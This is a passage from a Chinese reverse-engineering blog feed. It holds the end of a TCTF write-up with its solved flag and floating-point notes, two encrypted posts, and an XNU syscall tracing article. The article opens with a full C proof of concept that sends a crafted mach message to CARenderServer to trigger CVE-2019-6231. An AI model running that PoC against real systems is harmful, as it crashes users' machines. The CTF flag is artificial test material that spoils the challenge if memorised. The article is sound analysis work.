print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19G5pWePgz82FhqDeO6vPH26xGz8eGq7CdzNLqa2OyI6vVBEA3ujtrdZwKTB3+FRWRmwtAqhgjRNU7Yl62pMqvJkrO0/NbKb1MHeYC00tX9iigYt2Dm/80gujqyblikNoCOKVk1e7lC16hr7jEgeYYHjjqXn8Gad+nZHVkAY2X3CgxBeNbveTXmLrE4IbqpsN/iusNkK2Vc6ngxjO2N4wDkV9w2u4evPoUZ7MFirNpCthonkflgbcbx89YKUQzE5lhM4g9VCOT5/eZcQF+gQXwrlB1C+EbF0ajpOrtXSwwSWljbNQ3nJI/76B10sXS1EnjRNJ0ysbIfhJNv2RwQbq88LB7shY3NqtnqLg16kpK+aIrELwKfZ+U7iinWZm5AIwH1lMFCTD+7odo8oLygiPE/qDCakxjsfXrdEaLwkyFihFNgMc0VdkZsAUJSI8k42izbB485/Ou0o8BjeZvpmlcP1T+iFcieYrh83Q4JJzpODQin2DXS9LcyisgUyAJ3lvxH1L02JmL1DtvHR3OZB8m5TDUwrPMF3GQ79g9ZdLins7mUUS5/Yo4kOho4tLpVVLISeWwX55EccZbQ7u2YDd/c+XMyhv2MOV734hQrMOc0nUnckdC5CSkNk1MKJ5qKUzsGYUHfvIWrF7TvwUXgSGuBuIqDTO5+eqaXhEzI0nrQCm9co+cX5Ptkfm3jSA95LeA86XuxIxqMSsmecpD6tqrrKXhkVp3ZuF9WmhxtN0+MTx45UVvefZ/7MIChg26USmVe5g4S8QmRXT3I4xCyRV1y/g5DIdM77lv3IAV75uSgaTQyW269aZJtrcIu9Xy/ht7souaVpPt16qKbnISekYJkMDWhZ7izucvpiNRPXo0Yc7T6471GIqHBALWdZ+P8J2NF/0a2X2Lq76qz7bM/1WnuvPr9ErN68L+U1FaeOSN2bGg78mDdCCLPhDjVM+WuMTcOlpCnPLHapaF5dLQgKiysITgQC3FqL5hpBHvZKgsFabL4kRgTAKPwaZSZw4ajy5ONUaA02YywwTLa8UU7TPWstkXD0nQif48qS1NfHVy4CRYs7VybauiFBG0pI1sMDJFc+KBZlCUDBoh1V4krCqH3KmK++t1bIiDsznAp7mLt3/jBcmXHTcyoUTJ1FHbWRs8lFvEl3tObZDM4xdBn9SEZY7bW2i96ZlsBc6kaGqz9qJSIDbuPGv5IT3Tp0vjcPnWFgH/t2plQyf9DKeUZW1imhQZbySSV3zMlDw2u7lXwqVf25Urt8GqtCCGSKGrsXtDhv2bACQkB8+1U2BUpKJvuO5Dkagw5I3AAwSG2Qz+wiSYaWprofHi6d3H6DfoD+vygocerXG19gKkhpzQ/XSMVsYi42QLQD3ZpRWbz8EzAJ6HYCxf3+y24Yg+0EGgIiFKBRNOVnwwlYZMFOucoqUCnz88gaJ0ZJ354bVc8v54e8WUzj1oFsxf3Ld3dBifOphvCU7FNKv0XTvzPo+EbMEft6XP6DY5I5mzRWUgdqTt9zd9hb6D/NfAiu98CQmuOOz9RQaNzi28m5zuCybMW5NLJhwrQ/hGE+clwZGhnJBrQPuO5MQz+WsXQpBR0JGmwslAf0qWWsoW+kosxda5GO99TI4FvjM23sRJ3TaSVv4RtBCVV1sQMX0GbYXjxobDjWUAdiLeu9Vd0dFP+OsjS4SI6pf0V4FA1KwCmVBxSb7SgUxqm9mSiCsZAOJOl5qiCnRxmtrcovLF3lBJZhonnsAtdL0ZTLS+gMcFd//ozsiA/8vRSx+rhjUPUUIwFcABNfqgF7p3jctMFdO5b+aRWp1cI6doXV9M00yQoHs6/bJhrYrYdXc/Syr8/DDe8/aTRaiS6STv92ZTPROD1JdqS2eF2H9oer/v7vniFzE+3QA4yzrucHQjUs+y6VtM89lJkONdtMKxshXM8nwTfb4iYGFsZX3wHs4ZHt+7BKd2063TJK21Cgt/waAPlaeTMpnKiUgbR7eThOHOs9NPYkrechKBR8RGTGWQujSeu0SvpdjE7tqDz6LkOSZbtR7qsywHN0bJdKFoiQPG2HgdJwHPxi4ZqVG2fWXz4oT4Sv6OsiMrpi89OVN7IHbsu3R932F8ks4xOw2fUCkeni95rEuLL3l2WTm72lt7vA8ghvWxIDmO5jYsd5PwOvTKdkeZwoZl0BRaa005gR80X+4Xqi4qbaw4mjJtYjZMpBVuPzlM0+B8AIcmvTVXrRDefrFMN68NKpt7VngedZ+Z6xhEXyWrF4YYDljctcFIZg2thpGdZud8/o8We5ysg69dhmzn4+aEusvC/Ifoga0jsziuQaFqU2l3K8JMqAiAmgjhxel5U7Rx3TLyARm3yWytHQgH/q4de3TxyXtYlRoqn1W0kX3Yvm7i/AB6t0L6+/8SOzRa6FuAk4cN22r3PNgaXDud7r2xDDkAS5kHAYyW/EjbOlzfZ/cy3w2rxPIXf2aC50tzE9gQVnV2StNK3+/lRJJQITkDYf7Am1doFHG6Pcizv0ElkhExJTDn1VlrqwZmwThh5QC5zWH+RZQpRNX83SK/xId7oJ2/pU6ZadOwb176ZdwIdWe+Pgo81C/j3qjlwwFyRLmH/qXhkSPKO5H7Juq/dR18qNmJcPURYnNGKCM+/JeVOr5kvRHtUs9CF7Sk5Xi4UvjEucLv7AjJ1yYaj5KYhTunmJJLlcyUiTDH65A==</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
